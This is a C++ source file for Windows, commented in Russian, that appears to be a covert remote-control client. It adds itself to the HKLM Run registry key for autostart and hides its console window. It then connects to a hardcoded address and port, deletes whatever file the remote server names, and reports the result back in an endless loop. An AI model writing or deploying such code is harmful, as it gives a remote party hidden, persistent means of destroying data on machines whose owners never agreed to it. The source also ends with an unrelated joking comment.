#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <iostream>

#include <winsock2.h> 
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") 

#define PORT 5446
#define PC_IP "192.168.0.101"
#define UNLINK_ERROR_CODE -1
#define WINSOCK_API_INIT_ERROR 255

using namespace std;

int autorun(void) {
    DWORD path = 0;
    TCHAR szPath[MAX_PATH];
    HKEY hKey;
    
    if ((path = GetModuleFileName(NULL, szPath, MAX_PATH)) == 0) { // получаем путь до программы
        _tprintf(TEXT("error %lu\n"), GetLastError());
        return EXIT_FAILURE;
    }
    
    if (RegOpenKey(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&hKey) != ERROR_SUCCESS) { // открывает раздел реестра
        _tprintf(TEXT("error %lu\n"), GetLastError());
        return EXIT_FAILURE;
    }
    DWORD pathLen = path * sizeof(*szPath);
    if (RegSetValueEx(hKey, TEXT("CLIENT_CLIENT"), 0, REG_SZ, (LPBYTE)szPath, pathLen) != ERROR_SUCCESS) { // заносим значение в реестр
        RegCloseKey(hKey);
        _tprintf(TEXT("error %lu\n"), GetLastError());
        return EXIT_FAILURE;
    }
    RegCloseKey(hKey);
    return EXIT_SUCCESS;
}

int main() {
    while (true) {
        if(autorun() == EXIT_FAILURE) return EXIT_FAILURE; // автозапуск

        HWND hWnd = GetConsoleWindow(); // идентификатор окна
        ShowWindow(hWnd, SW_HIDE); // скрываем окно

        WSADATA wsaData; // структура для хранения информации о конкретной реализации интерфейса Windows Sockets
        WORD DLLVersion = MAKEWORD(2, 1); // BYTE bLow(major), BYTE bHigh 
        int result = -1;
        if (result = WSAStartup(DLLVersion, &wsaData)) { // Функция WSAStartup инициализирует WinSock. Эта функция всегда самая первая при начале работы с WinSock
            cout << "WSAStartup failed with error: %d\n" << result;
            return WINSOCK_API_INIT_ERROR;
        }

        SOCKADDR_IN addr; // Структура sockaddr_in описывает сокет для работы с протоколами IP
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;  
        addr.sin_port = htons(PORT); 
        addr.sin_addr.S_un.S_addr = inet_addr(PC_IP); 

        SOCKET Connection = socket(AF_INET, SOCK_STREAM, 0); // создание сокета, AF_INET для протокола  IP, для передачи данных через канал связи с TCP
        connect(Connection, (struct sockaddr*)&addr, sizeof(addr));  // подключение к сокету

        char ret, file_name[200];
        memset(file_name, '\0', sizeof(file_name));

        recv(Connection, file_name, sizeof(file_name), 0); // чтение данных из сокета

        if (_unlink(file_name) == UNLINK_ERROR_CODE) ret = false; // удаление
        else ret = true;
        send(Connection, &ret, sizeof(ret), 0); // передача данных серверу
    }
    return EXIT_SUCCESS; // НЕ, НУ Я ОФИГЕЛ В НАЧАЛЕ ОТ ФОТОСЕССИЙ/МЕРЧА/ЭМБЛЕМ/КРИЧАЛОК. Потом привык, не зря форкнул проект, сделавший меня тем, кто я есть.
}
